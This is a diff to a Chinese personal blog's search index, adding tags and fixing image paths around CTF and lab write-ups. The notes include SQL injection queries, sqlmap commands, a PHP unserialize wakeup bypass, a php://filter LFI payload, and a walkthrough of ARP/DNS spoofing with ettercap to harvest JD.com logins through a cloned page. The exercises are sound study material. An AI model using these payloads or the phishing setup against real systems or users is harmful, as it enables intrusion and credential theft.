@@ -23,6 +23,9 @@
 
 <p>得到flag!<br><a href="https://i.imgur.com/Jc9imGo.png" target="_blank" rel="noopener"></a></p>
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
       <tags>
         <tag>sql注入</tag>
       </tags>
@@ -46,8 +49,11 @@ E#---
 ---##</code></pre><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code>9</code></pre><h2 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> de[<span class="number">100</span>][<span class="number">100</span>];<span class="comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">map</span>[<span class="number">100</span>][<span class="number">100</span>];  <span class="comment">//用于存放迷宫地图 </span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,intP;  <span class="comment">//坐标</span></span><br><span class="line"><span class="keyword">int</span> to[<span class="number">2</span>][<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;  <span class="comment">//在当前坐标下能走的四个方向</span></span><br><span class="line"><span class="keyword">int</span> sx,ex,sy,ey;  <span class="comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span></span><br><span class="line"><span class="keyword">int</span> x,y,nx,ny; <span class="comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span></span><br><span class="line"><span class="keyword">int</span> r,l;  <span class="comment">//r为行数 l为列数 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(de,<span class="number">-1</span>,<span class="keyword">sizeof</span>(de));</span><br><span class="line">	<span class="built_in">queue</span>&lt;Pqu;</span><br><span class="line">	qu.push(P(sx,sy));   //将起点坐标放入队头 </span><br><span class="line">	de[sx][sy]=0;</span><br><span class="line">	<span class="keyword">while</span>(!qu.empty()) </span><br><span class="line">	&#123;</span><br><span class="line">		P p=qu.front();   //取出队头坐标 </span><br><span class="line">		qu.pop() ;//删除对头及走过的坐标 </span><br><span class="line">		x=p.first,y=p.second; </span><br><span class="line">		<span class="keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="keyword">break</span>; //到达终点 跳出循环		</span><br><span class="line">	 	<span class="keyword">for</span>(<span class="keyword">int</span> i=0;i&lt;4;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			nx=x+to[0][i];//开始向四个方向移动 </span><br><span class="line">			ny=y+to[1][i];			</span><br><span class="line">				<span class="keyword">if</span>(nx&gt;=<span class="number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="built_in">map</span>[nx][ny]!=<span class="string">'#'</span>&amp;&amp;de[nx][ny]==<span class="number">-1</span>)</span><br><span class="line">	 <span class="comment">//判断是否越界 以及是否能走  排除走过的路 </span></span><br><span class="line">	 &#123;</span><br><span class="line">	 	 qu.push(P(nx,ny));  <span class="comment">//将能走的坐标放入队列 之后依次删除 </span></span><br><span class="line">						 de[nx][ny]=de[x][y]+<span class="number">1</span>;  <span class="comment">//步数加一 </span></span><br><span class="line">					  &#125; 				  </span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(de[ex][ey]==<span class="number">-1</span>)  <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">//终点的记步数组为-1 及不能到达终点 </span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> de[ex][ey]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,i,j;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;l;</span><br><span class="line">			<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;l;j++)&#123; </span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;<span class="built_in">map</span>[i][j];</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">map</span>[i][j]==<span class="string">'S'</span>) <span class="comment">//记录起点坐标 </span></span><br><span class="line">				 &#123;</span><br><span class="line">					sx=i,sy=j;</span><br><span class="line">				 &#125; </span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">map</span>[i][j]==<span class="string">'E'</span>)  <span class="comment">//记录终点坐标 </span></span><br><span class="line">				 &#123;</span><br><span class="line">				 	ex=i,ey=j;</span><br><span class="line">				 &#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
+      <categories>
+        <category>C++</category>
+      </categories>
       <tags>
-        <tag>C++</tag>
+        <tag>bfs</tag>
       </tags>
   </entry>
   <entry>
@@ -72,8 +78,11 @@ E#---
 <p>查看表：</p>
 <pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
 <pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
       <tags>
-        <tag>sql注入</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -140,6 +149,9 @@ echo(serialize($test));   //输出被序列化的对象（test）
 <pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示：</p>
 <pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre><p>访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
       <tags>
         <tag>unserialize</tag>
       </tags>
@@ -156,6 +168,9 @@ echo(serialize($test));   //输出被序列化的对象（test）
 <h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="/2020/07/18/diaoyu/2.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问任何网页，全部指向为10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="/2020/07/18/diaoyu/5.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
 <h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码等，如图，然后点击登录" target="_blank" rel="noopener">www.jd.com输入用户名密码等，如图，然后点击登录</a><br><img src="/2020/07/18/diaoyu/7.png" alt><br>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" alt></p>
 ]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
       <tags>
         <tag>DNS</tag>
       </tags>
@@ -168,8 +183,11 @@ echo(serialize($test));   //输出被序列化的对象（test）
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">re <span class="comment">#正则表达式</span></span><br><span class="line">requests <span class="comment">#url请求</span></span><br><span class="line"><span class="built_in">time</span>   <span class="comment">#时间</span></span><br><span class="line">os     <span class="comment">#用于创建文件夹，保存图片</span></span><br></pre></td></tr></table></figure>
 <p>##准备工作<br>1.首先访问该链接<br><code>https://www.vmgirls.com/</code><br>2.随便点击一个进入查看详情<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式<br><img src="/2020/07/18/%E7%88%AC%E5%9B%BE/picturelink.png" alt="1"><br>该正则表达式为<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p>
 <h2 id="完整程序"><a href="#完整程序" class="headerlink" title="完整程序"></a>完整程序</h2><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding = utf - 8 -*-</span></span><br><span class="line"><span class="comment">#@Time : 2020/7/16 13:36</span></span><br><span class="line"><span class="comment">#@Author : sunzy</span></span><br><span class="line"><span class="comment">#@File : tupian.py</span></span><br><span class="line"><span class="built_in">import</span> re</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> time</span><br><span class="line"><span class="built_in">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="attr">dir</span> = <span class="string">"plmm"</span>        <span class="comment">#文件夹名字</span></span><br><span class="line"><span class="keyword">if</span> not os.path.exists(dir):   <span class="comment">#首先判断是否存在当前文件夹如果没有则创建一个</span></span><br><span class="line">    os.mkdir(dir)</span><br><span class="line"><span class="comment"># 模仿浏览器的首部信息，绕过一些网站的反爬取措施</span></span><br><span class="line"><span class="attr">head</span> = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"https://www.vmgirls.com/13344.html"</span></span><br><span class="line"><span class="attr">response</span> = requests.get(url, <span class="attr">headers</span> = head)   <span class="comment"># 访问目标网页，获取网页内容</span></span><br><span class="line"><span class="attr">html</span> = response.text</span><br><span class="line"></span><br><span class="line"><span class="attr">findlinks</span> = '&lt;a <span class="attr">href="(.*?)"</span> <span class="attr">alt=".*?"</span> <span class="attr">title=".*?"&gt;'</span></span><br><span class="line"><span class="attr">urls</span> = re.findall(findlinks, html)   <span class="comment">#爬取到的图片链接保存在urls中， 是一个列表</span></span><br><span class="line"></span><br><span class="line">for url <span class="keyword">in</span> urls:</span><br><span class="line">    time.sleep(<span class="number">1</span>)    <span class="comment">#防止访问速度过快使服务器崩溃</span></span><br><span class="line">    <span class="attr">file_name</span> = url.split('/')[-<span class="number">1</span>]    <span class="comment">#保存图片的名字</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">res</span> = requests.get(url, <span class="attr">headers</span> = head)   <span class="comment">#依此访问图片链接</span></span><br><span class="line">    <span class="keyword">with</span> open(dir+'/'+file_name, <span class="string">"wb"</span>) as f:   <span class="comment">#以二进制形式保存图片</span></span><br><span class="line">        f.write(res.content)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
       <tags>
-        <tag>python</tag>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -199,6 +217,9 @@ echo(serialize($test));   //输出被序列化的对象（test）
 <p>获取屏幕内容<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/5.png" alt></p>
 <p>控制命令行<br><img src="/2020/07/18/%E6%9C%A8%E9%A9%AC/6.png" alt></p>
 ]]></content>
+      <categories>
+        <category>木马</category>
+      </categories>
   </entry>
   <entry>
     <title>Bugku</title>
@@ -273,8 +294,11 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 <pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
 <pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -282,6 +306,12 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
     <url>/2020/08/16/SSTI/</url>
     <content><![CDATA[<p><img src="/2020/08/16/SSTI/SSTI%E6%A8%A1%E6%9D%BF.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
 ]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>STTI</tag>
+      </tags>
   </entry>
   <entry>
     <title>nctf</title>
@@ -301,22 +331,22 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 
 <h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
 <p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
-<p><img src="/2020/08/29/nctf/nctf%5Cqd1.png" alt></p>
+<p><img src="/2020/08/29/nctf/qd1.png" alt></p>
 <p>再次输入口令即可。</p>
 <p>考点为前端代码修改</p>
 <h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
 <p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
-<p><img src="/2020/08/29/nctf/nctf%5C%E8%BF%99%E4%B8%8D%E6%98%AFweb.png" alt></p>
+<p><img src="/2020/08/29/nctf/%E8%BF%99%E4%B8%8D%E6%98%AFweb.png" alt></p>
 <h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
-<p><img src="/2020/08/29/nctf/nctf%5C%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B.png" alt></p>
+<p><img src="/2020/08/29/nctf/%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B.png" alt></p>
 <h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
 <p>点击发现url改变，跳转到了另一个页面</p>
 <p>bp抓包试试，go一下，相应包中出现flag</p>
-<p><img src="/2020/08/29/nctf/nctf%5Cds1.png" alt></p>
+<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
 <h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
 <p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
-<p><img src="/2020/08/29/nctf/nctf%5Cecho.png" alt></p>
-<p><img src="/2020/08/29/nctf/nctf%5Cphpencode.png" alt></p>
+<p><img src="/2020/08/29/nctf/echo.png" alt></p>
+<p><img src="/2020/08/29/nctf/phpencode.png" alt></p>
 <h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
 <p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
 <p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
@@ -324,11 +354,11 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;&#x2F;title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
-<p><img src="/2020/08/29/nctf/nctf%5Cds2.png" alt></p>
+<p><img src="/2020/08/29/nctf/ds2.png" alt></p>
 <h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
 <p> <strong>TIP: 0==not</strong> </p>
 <p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code> go</p>
-<p><img src="/2020/08/29/nctf/nctf%5Ccookie.png" alt></p>
+<p><img src="/2020/08/29/nctf/cookie.png" alt></p>
 <h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
 <p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站" target="_blank" rel="noopener">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件" target="_blank" rel="noopener">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎" target="_blank" rel="noopener">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛" target="_blank" rel="noopener">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据" target="_blank" rel="noopener">元数据</a>（Metadata，又称元数据）。</strong></p>
 <p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
@@ -362,6 +392,9 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
       </categories>
       <tags>
         <tag>md5</tag>
+        <tag>sql</tag>
+        <tag>代码审计</tag>
+        <tag>bypass</tag>
       </tags>
   </entry>
 </search>
